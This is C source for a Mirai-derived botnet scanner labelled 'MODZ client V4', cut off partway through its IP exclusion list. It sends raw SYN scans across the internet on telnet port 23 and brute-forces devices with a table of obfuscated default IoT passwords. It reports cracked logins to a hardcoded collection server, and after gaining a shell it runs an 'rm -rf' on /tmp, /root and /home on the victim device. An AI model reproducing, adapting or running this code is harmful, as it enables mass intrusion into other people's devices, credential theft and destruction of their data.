/*
███╗   ███╗ ██████╗ ██████╗ ███████╗
████╗ ████║██╔═══██╗██╔══██╗╚══███╔╝
██╔████╔██║██║   ██║██║  ██║  ███╔╝ 
██║╚██╔╝██║██║   ██║██║  ██║ ███╔╝  
██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗
╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ 


If you have this you are trusted. Please do not leak!
MODZ client V4

Current Owner Count - 2
  ____                                                    
 / ___|    ___    __ _   _ __    _ __     ___   _ __ 
 \___ \   / __|  / _` | | '_ \  | '_ \   / _ \ | '__|
  ___) | | (__  | (_| | | | | | | | | | |  __/ | |   
 |____/   \___|  \__,_| |_| |_| |_| |_|  \___| |_|   
 
 Its pretty basic, theres a scaner and a killer in here based off mirai and edited to work on qbot. Dont worry about the strings here the bot gets encrypted when you compile i was just being lazy ;)
 

*/
#pragma once
#define TRUE 1
#define FALSE 0

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define SCANIP (int)inet_addr((const char*)"159.89.131.93");
#define SCANPORT 1338

#ifdef TELNET
#define SCANNER_MAX_CONNS   64
#define SCANNER_RAW_PPS     80
#else
#define SCANNER_MAX_CONNS   128
#define SCANNER_RAW_PPS     160
#endif

#define SCANNER_RDBUF_SIZE  256
#define SCANNER_HACK_DRAIN  64

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
//#include <linux/ip.h>
#include <linux/tcp.h>

struct scanner_auth {
    char *username;
    char *password;
    uint16_t weight_min, weight_max;
    uint8_t username_len, password_len;
};

struct scanner_connection {
    struct scanner_auth *auth;
    int fd, last_recv;
    enum {
        SC_CLOSED,
        SC_CONNECTING,
        SC_HANDLE_IACS,
        SC_WAITING_USERNAME,
        SC_WAITING_PASSWORD,
        SC_WAITING_PASSWD_RESP,
        SC_WAITING_ENABLE_RESP,
        SC_WAITING_SYSTEM_RESP,
        SC_WAITING_SHELL_RESP,
        SC_WAITING_SH_RESP,
        SC_WAITING_TOKEN_RESP,
		SC_GET_DEVICE_READY
    } state;
    uint32_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[SCANNER_RDBUF_SIZE];
    uint8_t tries;
};

uint32_t LOCAL_ADDR;

void scanner_init();
void scanner_kill(void);

static void setup_connection(struct scanner_connection *);
static uint32_t get_random_ip(void);

static int consume_iacs(struct scanner_connection *);
static int consume_any_prompt(struct scanner_connection *);
static int consume_user_prompt(struct scanner_connection *);
static int consume_pass_prompt(struct scanner_connection *);
static int consume_resp_prompt(struct scanner_connection *);

static void add_auth_entry(char *, char *, uint16_t);
static struct scanner_auth *random_auth_entry(void);
static void report_working(uint32_t, uint16_t, struct scanner_auth *);
static char *deobf(char *, int *);
static char can_consume(struct scanner_connection *, uint8_t *, int);


int scanner_pid, rsck, rsck_out, auth_table_len = 0;
char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
struct scanner_auth *auth_table = NULL;
struct scanner_connection *conn_table;
uint16_t auth_table_max_weight = 0;
uint32_t fake_time = 0;





uint32_t util_local_addr(void)
{
    int fd = 0;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    errno = 0;
    if((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[util] Failed to call socket(), errno = %d\n", errno);
        #endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);

    return addr.sin_addr.s_addr;
}

int util_strlen(char *str)
{
    int c = 0;

    while(*str++ != 0)
        c++;

    return c;
}

void util_memcpy(void *dst, void *src, int len)
{
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while(len--)
        *r_dst++ = *r_src++;
}

void util_zero(void *buf, int len)
{
    char *zero = buf;
    while(len--)
        *zero++ = 0;
}

int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i = 0, matched = 0;

    if(mem_len > buf_len)
        return -1;

    for(i = 0; i < buf_len; i++)
    {
        if(buf[i] == mem[matched])
        {
            if(++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}

uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}

static uint32_t x, y, z, w;

void rand_init(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void) //period 2^96-1
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

void rand_str(char *str, int len) // Generate random buffer (not alphanumeric!) of length len
{
    while (len > 0)
    {
        if (len >= 4)
        {
            *((uint32_t *)str) = rand_next();
            str += sizeof (uint32_t);
            len -= sizeof (uint32_t);
        }
        else if (len >= 2)
        {
            *((uint16_t *)str) = rand_next() & 0xFFFF;
            str += sizeof (uint16_t);
            len -= sizeof (uint16_t);
        }
        else
        {
            *str++ = rand_next() & 0xFF;
            len--;
        }
    }
}

void rand_alphastr(uint8_t *str, int len) // Random alphanumeric string, more expensive than rand_str
{
    const char alphaset[] = "abcdefghijklmnopqrstuvw012345678";

    while (len > 0)
    {
        if (len >= sizeof (uint32_t))
        {
            int i;
            uint32_t entropy = rand_next();

            for (i = 0; i < sizeof (uint32_t); i++)
            {
                uint8_t tmp = entropy & 0xff;

                entropy = entropy >> 8;
                tmp = tmp >> 3;

                *str++ = alphaset[tmp];
            }
            len -= sizeof (uint32_t);
        }
        else
        {
            *str++ = rand_next() % (sizeof (alphaset));
            len--;
        }
    }
}

int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if (ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

void scanner_init(void)
{
    int i;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    scanner_pid = fork();
    if (scanner_pid > 0 || scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    fake_time = time(NULL);
    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to initialize raw socket, cannot scan\n");
#endif
        exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
#ifdef DEBUG
        printf("[scanner] Failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while (ntohs(source_port) < 1024);

    iph = (struct iphdr *)scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;

    // Set up passwords
    add_auth_entry("\x26\x27\x24\x23\x37\x2E\x36", "\x0D\x3A\x2A\x2E\x35\x11\x05\x7A", 10);        // default:OxhlwSG8
    add_auth_entry("\x26\x27\x24\x23\x37\x2E\x36", "\x11\x70\x24\x05\x33\x0C\x04\x31", 10);        // default:S2fGqNFs
    add_auth_entry("\x26\x27\x24\x23\x37\x2E\x36", "\x36\x2E\x08\x35\x32\x20\x2D\x74", 10);        // default:tlJwpbo6
	add_auth_entry("\x26\x27\x24\x23\x37\x2E\x36", "\x26\x27\x24\x23\x37\x2E\x36", 10);            // default:default
	add_auth_entry("\x26\x27\x24\x23\x37\x2E\x36", "", 10);                                        // default:NUL
	add_auth_entry("\x30\x2D\x2D\x36", "\x23\x26\x2F\x2B\x2C", 9);                                 // root:admin
    add_auth_entry("\x30\x2D\x2D\x36", "\x34\x2B\x38\x3A\x34", 9);                                 // root:vizxv
    add_auth_entry("\x30\x2D\x2D\x36", "\x23\x2C\x29\x2D", 8);                                     // root:anko
    add_auth_entry("\x30\x2D\x2D\x36", "\x2A\x2B\x71\x77\x73\x7A", 8);                             // root:hi3518
    add_auth_entry("\x23\x26\x2F\x2B\x2C", "\x23\x26\x2F\x2B\x2C", 8);                             // admin:admin
    add_auth_entry("\x30\x2D\x2D\x36", "\x3A\x21\x71\x77\x73\x73", 8);                             // root:xc3511
	add_auth_entry("\x31\x37\x32\x32\x2D\x30\x36", "\x31\x37\x32\x32\x2D\x30\x36", 8);             // support:support
    add_auth_entry("\x23\x26\x2F\x2B\x2C", "\x23\x33\x37\x23\x30\x2B\x2D", 8);                     // admin:aquario
    add_auth_entry("\x30\x2D\x2D\x36", "\x29\x2E\x34\x73\x70\x71\x76", 7);                         // root:klv1234
    add_auth_entry("\x30\x2D\x2D\x36", "\x29\x2E\x34\x73\x70\x71", 7);                             // root:klv123
    add_auth_entry("\x23\x26\x2F\x2B\x2C", "\x73\x70\x71\x76", 7);                                 // admin:1234
    add_auth_entry("\x23\x26\x2F\x2B\x2C", "\x32\x23\x31\x31", 7);                                 // admin:pass
	add_auth_entry("\x26\x23\x27\x2F\x2D\x2C", "", 7);                                             // daemon:NUL
	add_auth_entry("\x26\x23\x27\x2F\x2D\x2C", "\x26\x23\x27\x2F\x2D\x2C", 7);                     // daemon:daemon
	add_auth_entry("\x37\x31\x27\x30", "\x37\x31\x27\x30", 6);                                     // user:user
    add_auth_entry("\x30\x2D\x2D\x36", "\x77\x37\x32", 6);                                         // root:5up
	add_auth_entry("\x30\x2D\x2D\x36", "\x18\x36\x27\x77\x70\x73", 6);                             // root:Zte521
    add_auth_entry("\x23\x26\x2F\x2B\x2C", "\x2F\x27\x2B\x2C\x31\x2F", 5);                         // admin:meinsm
    add_auth_entry("\x23\x26\x2F\x2B\x2C", "\x01\x27\x2C\x36\x37\x30\x3B\x0E\x73\x2C\x29", 5);     // admin:CenturyL1nk
    add_auth_entry("\x30\x2D\x2D\x36", "\x15\x2B\x2C\x73\x26\x2D\x15\x66", 4);                     // root:Win1doW$
    add_auth_entry("\x30\x2D\x2D\x36", "\x70\x72\x72\x7A\x72\x7A\x70\x74", 4);                     // root:20080826
	add_auth_entry("\x30\x2D\x2D\x36", "\x2B\x32\x21\x23\x2F\x1D\x30\x36\x77\x71\x77\x72", 5);     // root:ipcam_rt5350
	add_auth_entry("\x23\x26\x2F\x2B\x2C", "\x2A\x2D\x76\x37\x29\x37\x74\x23\x36", 5);             // admin:ho4uku6at



#ifdef DEBUG
    printf("[scanner] Scanner process initialized. Scanning started.\n");
#endif

    // Main logic loop
    while (TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        struct scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if (fake_time != last_spew)
        {
            last_spew = fake_time;

            for (i = 0; i < SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
                tcph->dest = htons(23);
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while (TRUE)
        {
            int n;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct scanner_connection *conn;

            errno = 0;
            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
                continue;
            if (tcph->source != htons(23))
                continue;
            if (tcph->dest != source_port)
                continue;
            if (!tcph->syn)
                continue;
            if (!tcph->ack)
                continue;
            if (tcph->rst)
                continue;
            if (tcph->fin)
                continue;
            if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
            {
                if (conn_table[n].state == SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if (conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
#ifdef DEBUG
            printf("[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif
        }

        // Load file descriptors into fdsets
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            int timeout;

            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);

            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
#ifdef DEBUG
                printf("[scanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;

                // Retry
                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                {
                    if (++(conn->tries) == 10)
                    {
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    }
                    else
                    {
                        setup_connection(conn);
#ifdef DEBUG
                        printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                    }
                }
                else
                {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                }
                continue;
            }

            if (conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
                    conn->state = SC_HANDLE_IACS;
                    conn->auth = random_auth_entry();
                    conn->rdbuf_pos = 0;
#ifdef DEBUG
                    printf("[scanner] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
#endif
                }
                else
                {
#ifdef DEBUG
                    printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (TRUE)
                {
                    int ret;

                    if (conn->state == SC_CLOSED)
                        break;

                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret == 0)
                    {
#ifdef DEBUG
                        printf("[scanner] FD%d connection gracefully closed\n", conn->fd);
#endif
                        errno = ECONNRESET;
                        ret = -1; // Fall through to closing connection below
                    }
                    if (ret == -1)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                        {
#ifdef DEBUG
                            printf("[scanner] FD%d lost connection\n", conn->fd);
#endif
                            close(conn->fd);
                            conn->fd = -1;

                            // Retry
                            if (++(conn->tries) >= 10)
                            {
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                            else
                            {
                                setup_connection(conn);
#ifdef DEBUG
                                printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                            }
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;
                    int consumed = 0;
                    while (TRUE)
                    {

                        switch (conn->state)
                        {
                        case SC_HANDLE_IACS:
                            if ((consumed = consume_iacs(conn)) > 0)
                            {
                                conn->state = SC_WAITING_USERNAME;
#ifdef DEBUG
                                printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_USERNAME:
                            if ((consumed = consume_user_prompt(conn)) > 0)
                            {
                                send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_PASSWORD;
#ifdef DEBUG
                                printf("[scanner] FD%d received username prompt\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_PASSWORD:
                            if ((consumed = consume_pass_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d received password prompt\n", conn->fd);
#endif

                                // Send password
                                send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_PASSWD_RESP;
                            }
                            break;
                        case SC_WAITING_PASSWD_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received shell prompt\n", conn->fd);
#endif

                                // Send enable / system / shell / sh to session to drop into shell if needed
                                tmp_str = "enable";
                                send(conn->fd, tmp_str, strlen(tmp_str), MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_ENABLE_RESP;
                            }
                            break;
                        case SC_WAITING_ENABLE_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                tmp_str = "system";
                                send(conn->fd, tmp_str, strlen(tmp_str), MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_SYSTEM_RESP;
                            }
                            break;
                        case SC_WAITING_SYSTEM_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif
                                tmp_str = "shell";
                                send(conn->fd, tmp_str, strlen(tmp_str), MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_SHELL_RESP;
                            }
                            break;
                        case SC_WAITING_SHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received enable prompt\n", conn->fd);
#endif

                                tmp_str = "sh";
                                send(conn->fd, tmp_str, strlen(tmp_str), MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_SH_RESP;
                            }
                            break;
                        case SC_WAITING_SH_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                // Send query string
                                tmp_str = "/bin/busybox daddyl33t";
                                send(conn->fd, tmp_str, strlen(tmp_str), MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_TOKEN_RESP;
                            }
                            break;
                        case SC_WAITING_TOKEN_RESP:
                            consumed = consume_resp_prompt(conn);
                            if (consumed == -1)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d invalid username/password combo\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;

                                // Retry
                                if (++(conn->tries) == 10)
                                {
                                    conn->tries = 0;
                                    conn->state = SC_CLOSED;
                                }
                                else
                                {
                                    setup_connection(conn);
#ifdef DEBUG
                                    printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                                }
                            }
                            else if (consumed > 0)
                            {
/*
                                char *tmp_str;
                                int tmp_len;
#ifdef DEBUG
                                printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
#endif
                                report_working(conn->dst_addr, conn->dst_port, conn->auth);
                                close(conn->fd);
                                conn->fd = -1;
*/
                                conn->state = SC_GET_DEVICE_READY;
                            }
                            break;
						case SC_GET_DEVICE_READY:
						    //CASE WROTE BY 1m4osec; Just gets the device ready for infections by cleaning out unusable files
					        //Note: This in no way harms the device because that would be illigal :)
							if(1) {
							    char *command1;
							    char *command2;
							    strcpy(command1, "rm -rf /var/tmp/* /tmp/* /root/* /home/*\r\n");
							    strcpy(command2, "Your Shit Done Got Jacked Mayen {DaddyL33T}\r\n");
							    send(conn->fd, command1, strlen(command1), MSG_NOSIGNAL);
							    send(conn->fd, command2, strlen(command2), MSG_NOSIGNAL);
							    char *tmp_str;
                                int tmp_len;
#ifdef DEBUG
                                printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
#endif
                                report_working(conn->dst_addr, conn->dst_port, conn->auth);
                                close(conn->fd);
                                conn->fd = -1;
							}
							break;
                        default:
                            consumed = 0;
                            break;
                        }

                        // If no data was consumed, move on
                        if (consumed == 0)
                            break;
                        else
                        {
                            if (consumed > conn->rdbuf_pos)
                                consumed = conn->rdbuf_pos;

                            conn->rdbuf_pos -= consumed;
                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                        }
                    }
                }
            }
        }
    }
}

void scanner_kill(void)
{
    kill(scanner_pid, 9);
}

static void setup_connection(struct scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to call socket()\n");
#endif
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
}

static uint32_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while(
(o1 == 127) ||
(o1 == 0) ||
(o1 == 3) ||
(o1 == 15) ||
(o1 == 56) ||
(o1 == 10) ||
(o1 == 25) ||
(o1 == 49) ||
(o1 == 50) ||
(o1 == 137) ||
(o1 == 6) ||
(o1 == 7) ||
(o1 == 11) ||
(o1 == 21) ||
(o1 == 22) ||
(o1 == 26) ||
(o1 == 28) ||
(o1 == 29) ||
(o1 == 30) ||
(o1 == 33) ||
(o1 == 55) ||
(o1 == 214) ||
(o1 == 215) ||
(o1 == 192 && o2 == 168) ||
(o1 == 146 && o2 == 17) ||
(o1 == 146 && o2 == 80) ||
(o1 == 146 && o2 == 98) ||
(o1 == 146 && o2 == 154) ||
(o1 == 147 && o2 == 159) ||
(o1 == 148 && o2 == 114) ||
(o1 == 150 && o2 == 125) ||
(o1 == 150 && o2 == 133) ||
(o1 == 150 && o2 == 144) ||
(o1 == 150 && o2 == 149) ||
(o1 == 150 && o2 == 157) ||
(o1 == 150 && o2 == 184) ||
(o1 == 150 && o2 == 190) ||
(o1 == 150 && o2 == 196) ||
(o1 == 152 && o2 == 82) ||
(o1 == 152 && o2 == 229) ||
(o1 == 157 && o2 == 202) ||
(o1 == 157 && o2 == 217) ||
(o1 == 161 && o2 == 124) ||
(o1 == 162 && o2 == 32) ||
(o1 == 155 && o2 == 96) ||
(o1 == 155 && o2 == 149) ||
(o1 == 155 && o2 == 155) ||
(o1 == 155 && o2 == 178) ||
(o1 == 164 && o2 == 158) ||
(o1 == 156 && o2 == 9) ||
(o1 == 167 && o2 == 44) ||
(o1 == 168 && o2 == 68) ||
(o1 == 168 && o2 == 85) ||
(o1 == 168 && o2 == 102) ||
(o1 == 203 && o2 == 59) ||
(o1 == 204 && o2 == 34) ||
(o1 == 207 && o2 == 30) ||
(o1 == 117 && o2 == 55) ||
(o1 == 117 && o2 == 56) ||
(o1 == 80 && o2 == 235) ||
(o1 == 207 && o2 == 120) ||
(o1 == 209 && o2 == 35) ||
(o1 == 64 && o2 == 70) ||
(o1 == 172 && o2 >= 16 && o2 < 32) ||
(o1 == 100 && o2 >= 64 && o2 < 127) ||
(o1 == 169 && o2 == 254) ||
(o1 == 198 && o2 >= 18 && o2 < 20) ||
(o1 == 64 && o2 >= 69 && o2 < 227) ||
(o1 == 128 && o2 >= 35 && o2 < 237) ||
(o1 == 129 && o2 >= 22 && o2 < 255) ||
(o1 == 130 && o2 >= 40 && o2 < 168) ||
(o1 == 131 && o2 >= 3 && o2 < 251) ||
(o1 == 132 && o2 >= 3 && o2 < 251) ||
(o1 == 134 && o2 >= 5 && o2 < 235) ||
(o1 == 136 && o2 >= 177 && o2 < 223) ||
(o1 == 138 && o2 >= 13 && o2 < 194) ||
(o1 == 139 && o2 >= 31 && o2 < 143) ||
(o1 == 140 && o2 >= 1 && o2 < 203) ||
(o1 == 143 && o2 >= 45 && o2 < 233) ||
(o1 == 144 && o2 >= 99 && o2 < 253) ||
(o1 == 146 && o2 >= 165 && o2 < 166) ||
(o1 == 147 && o2 >= 35 && o2 < 43) ||
(o1 == 147 && o2 >= 103 && o2 < 105) ||
(o1 == 147 && o2 >= 168 && o2 < 170) ||
(o1 == 147 && o2 >= 198 && o2 < 200) ||
(o1 == 147 && o2 >= 238 && o2 < 255) ||
(o1 == 150 && o2 >= 113 && o2 < 115) ||
(o1 == 152 && o2 >= 151 && o2 < 155) ||
(o1 == 153 && o2 >= 21 && o2 < 32) ||
(o1 == 155 && o2 >= 5 && o2 < 10) ||
(o1 == 155 && o2 >= 74 && o2 < 89) ||
(o1 == 155 && o2 >= 213 && o2 < 222) ||
(o1 == 157 && o2 >= 150 && o2 < 154) ||
(o1 == 158 && o2 >= 1 && o2 < 21) ||
(o1 == 158 && o2 >= 235 && o2 < 247) ||
(o1 == 159 && o2 >= 120 && o2 < 121) ||
(o1 == 160 && o2 >= 132 && o2 < 151) ||
(o1 == 64 && o2 >= 224 && o2 < 227) ||
(o1 == 162 && o2 >= 45 && o2 < 47) ||
(o1 == 163 && o2 >= 205 && o2 < 207) ||
(o1 == 164 && o2 >= 45 && o2 < 50) ||
